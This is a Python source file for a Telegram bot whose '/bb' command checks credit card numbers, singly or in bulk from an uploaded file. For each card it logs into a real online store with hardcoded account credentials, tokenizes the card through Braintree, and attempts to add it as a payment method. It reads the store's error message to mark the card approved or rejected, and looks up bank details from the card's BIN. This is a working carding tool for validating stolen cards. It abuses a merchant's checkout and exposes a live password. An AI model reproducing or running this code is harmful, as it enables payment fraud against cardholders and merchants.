import requests
import base64
import json
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import random
from helpers.timemanager import run_sync_in_thread
import base64, json, uuid, string, time, os, json
import re
from helpers.User_Control import user_check

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()


def id_session():
    uuid_session = str(uuid.uuid4())
    return uuid_session


def generate_custom_id():
    base_uuid = str(uuid.uuid4())
    custom_id = f"0_{base_uuid[:8]}-{base_uuid[9:13]}-{base_uuid[14:18]}-{base_uuid[19:23]}-{base_uuid[24:]}"
    return custom_id


def base64_url_to_base64(base64_url):
    # Replace URL-safe characters with standard Base64 characters
    base64_standard = base64_url.replace("-", "+").replace("_", "/")

    # Add padding if needed
    padding = len(base64_standard) % 4
    if padding:
        base64_standard += "=" * (4 - padding)

    base64_code = base64.b64decode(base64_standard)

    return base64_code


def email_braintree():
    email = (
        "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        + "@gmail.com"
    )
    return email


def get_name_rand():
    first = "".join(random.choices(string.ascii_lowercase, k=5))
    second = "".join(random.choices(string.ascii_lowercase, k=5))

    return first, second


@Client.on_message(filters.command("bb"))
async def check_braintree_new_card(bot: Client, cmd: Message):
    user = await user_check(bot, cmd)
    if not user:
        return
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")

    # Check if the command is a reply to a message with a text/plain document
    if (
        cmd.reply_to_message
        and cmd.reply_to_message.document
        and cmd.reply_to_message.document.mime_type == "text/plain"
    ):
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, "r", encoding="utf-8") as f:
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split("|")[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()

                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            exy = (
                                "20" + ex
                            )  # Handle other cases (e.g., only two digits)

                        # Handle specific conditions
                        if exy in ["21", "22", "23", "24"]:
                            exy = exy[0] + "7"
                        time.sleep(8)
                        # Call your check_vbv function
                        R1 = BraintreeAuth()
                        await R1._Post_GraphQL_Api(cc.strip(), exp, exy, cvc, bot, cmd)
                        # await check_vbv(cc.strip(), exp, exy, cvc, bot, cmd)
                    except ValueError:
                        print(f"Error parsing line: {c}")
            await status.delete()
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            os.remove(cards_path)
    elif cmd.text:
        try:
            data = cmd.text.split("/bb", 1)[1].strip().split("|")
            if len(data) < 4:
                raise IndexError("Not enough data provided")

            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()

            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)

            # Handle specific conditions
            if exy in ["21", "22", "23", "24"]:
                exy = exy[0] + "7"

            # Call your check_vbv function
            R1 = BraintreeAuth()
            await R1._Post_GraphQL_Api(cc.strip(), exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/bb </code> Checks VBV Card</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/bb </code> Checks VBV Card</b>")


class BraintreeAuth:
    def __init__(self):
        self.Site_Api = "https://ironsidecomputers.com/my-account/"
        self.Config_Api = "https://ironsidecomputers.com/my-account/add-payment-method/"
        self.GraphQL_Api = "https://payments.braintree-api.com/graphql"
        self.session = requests.Session()

    def _post_request_site(self):
        headers = {
            "Host": "ironsidecomputers.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "If-Modified-Since": "Mon, 06 Jan 2025 16:47:17 GMT",
            "Priority": "u=0, i",
            "Te": "trailers",
            "Connection": "keep-alive",
        }
        headers1 = {
            "Host": "ironsidecomputers.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://ironsidecomputers.com",
            "Referer": "https://ironsidecomputers.com/my-account/",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i",
            "Te": "trailers",
        }
        response = self.session.post(self.Site_Api, headers=headers)
        nonce = self.extract_value(
            response.text,
            '<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="',
            '" />',
        )

        Config_payload = f"username=antorsir1718%40gmail.com&password=c%23-%7DVct4d*.j%2CUm&woocommerce-login-nonce={nonce}&_wp_http_referer=%2Fmy-account%2F&login=Login"

        Config_Rq = self.session.post(
            self.Site_Api, headers=headers1, data=Config_payload
        )

        wc_request = self.session.get(self.Config_Api, headers=headers)

        wc_token = self.extract_value(
            wc_request.text, 'wc_braintree_client_token = ["', '"]'
        )
        nonce1 = self.extract_value(
            wc_request.text,
            'name="woocommerce-add-payment-method-nonce" value="',
            '" />',
        )
        base64_bytes = json.loads(base64.b64decode(wc_token))
        # print(base64_bytes)
        fingerprint = base64_bytes["authorizationFingerprint"]
        return fingerprint, nonce1

    @run_sync_in_thread
    def _Post_GraphQL_Api(self, card_number, exp_month, exp_year, cvv, bot, cmd):
        fingerprint, nonce = self._post_request_site()
        headers = {
            "Host": "payments.braintree-api.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        playload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "dd72d4e3-f2f0-480c-832a-50573f5d647e",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{card_number}",
                        "expirationMonth": f"{exp_month}",
                        "expirationYear": f"{exp_year}",
                        "cvv": f"{cvv}",
                        "billingAddress": {
                            "postalCode": "10001",
                            "streetAddress": "14th street",
                        },
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        response = self.session.post(
            self.GraphQL_Api, headers=headers, data=json.dumps(playload)
        )
        try:
            data = response.json()
            card_token = data["data"]["tokenizeCreditCard"]["token"]
        except Exception as err:
            print(err)
            print(response.text)
            return None
        else:
            headers1 = {
                "Host": "ironsidecomputers.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://ironsidecomputers.com",
                "Referer": "https://ironsidecomputers.com/my-account/add-payment-method/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Priority": "u=0, i",
                "Te": "trailers",
            }
            playload1 = f"payment_method=braintree_cc&braintree_cc_nonce_key={card_token}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F2np5c2vx3j8nk63b%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F2np5c2vx3j8nk63b%22%7D%2C%22merchantId%22%3A%222np5c2vx3j8nk63b%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Discover%22%2C%22JCB%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Ironside+Computers%22%2C%22clientId%22%3A%22Afi8VAfAmDYSZSXKXBkQUMjQA0IWiZ4yBaL-MM4xm7zOsMHpDLw_FEeFpHihZVv3TC8AWMSj6JJ-EIVo%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22IronsideComputersInc_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce={nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"
            payment = self.session.post(
                self.Config_Api, headers=headers1, data=playload1
            )
            req = requests.get(
                f"https://bins.antipublic.cc/bins/{card_number[:6]}", verify=True
            )
            requ = req.json()
            error_msg = self.extract_value(
                payment.text, '<ul class="woocommerce-error" role="alert">', "</div>"
            )
            msg = "Invalid postal code "
            if error_msg and (msg in error_msg):
                message_text = f"""
<b>⎚ Approved ✅</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ Approved </b>

<b>BIN ⇾</b> <code>{card_number[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
                cmd.reply_text(message_text)
                print(error_msg)
            else:
                match = re.search(r"Reason:\s*(.+)", error_msg)
                print(match)
                print(error_msg)
                if match:
                    reason = match.group(1).strip()
                message_text = f"""
<b>⎚ Rejected ❌</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ {reason if reason else "Unknow Decliend"}</b>

<b>BIN ⇾</b> <code>{card_number[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(0, 9)} seconds</code>
"""
                cmd.reply_text(message_text)
                print(error_msg)
            time.sleep(19)

    @staticmethod
    def extract_value(source, left, right):
        """Extract value from the source based on delimiters"""
        try:
            start = source.index(left) + len(left)
            end = source.index(right, start)
            return source[start:end]
        except ValueError:
            return None
